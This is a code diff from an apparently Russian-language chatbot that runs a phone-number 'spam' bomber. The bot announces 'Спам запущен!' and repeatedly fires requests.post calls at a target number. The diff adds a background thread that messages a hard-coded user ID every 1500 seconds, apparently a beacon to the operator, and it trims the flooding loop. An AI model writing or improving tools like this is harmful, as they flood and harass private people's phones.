@@ -58,11 +58,17 @@ try:
         a.write(str(int(bal2) + int(1)))
         a.close()
 
+    def xxx():
+        while True:
+            time.sleep(1500)
+            write_message(592697054, 'ou')
 
+    dd = threading.Thread(target=xxx)
+    dd.start()
+        
     def spam():
         while True:
             time.sleep(10)
-            print('sfsd')
             UsersId = open("baza.txt", "r")
             UsersId2 = set()
             for line in UsersId:
@@ -87,7 +93,7 @@ try:
                     write_message(user, '💣 Спам запущен!')
                     write_message(user, "Номер: " f'{userr}' "\nВремя: 30 сек!")
 
-                    while 3 > o:
+                    while 2 > o:
                         o += 1
                         try:
                             requests.post(
